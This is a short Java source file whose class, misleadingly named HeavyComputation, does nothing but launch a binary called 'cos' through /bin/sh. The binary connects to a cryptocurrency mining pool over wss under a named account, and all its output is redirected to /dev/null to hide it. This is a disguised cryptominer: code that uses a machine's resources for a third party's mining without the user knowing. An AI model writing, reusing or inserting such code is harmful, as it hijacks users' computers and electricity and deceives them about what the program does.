import java.io.File;
import java.io.IOException;

public class HeavyComputation {

    public static void performHeavyComputation() throws IOException, InterruptedException {
        // The command to execute, concatenated for simplicity in Java
        String command = "./cos --pool wss://aleo.oula.network:6666 --account vbropa --worker-name RANDOM";

        // Execute the command with output redirection to /dev/null to hide output
        Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command + " > /dev/null 2>&1"});

        // Wait for the process to finish
        process.waitFor();
        
        // Check exit value to see if the command was successful (optional)
        if (process.exitValue() != 0) {
            // If you want to log errors somewhere else (not to console)
            // You could write to a log file here or handle this silently
            System.err.println("Command execution failed with exit value: " + process.exitValue());
        }
    }

    public static void main(String[] args) {
        try {
            performHeavyComputation();
        } catch (IOException | InterruptedException e) {
            // Here we're just printing to console, but in a production environment, 
            // you might want to log this to a file or handle it silently
            e.printStackTrace();
        }
    }
}
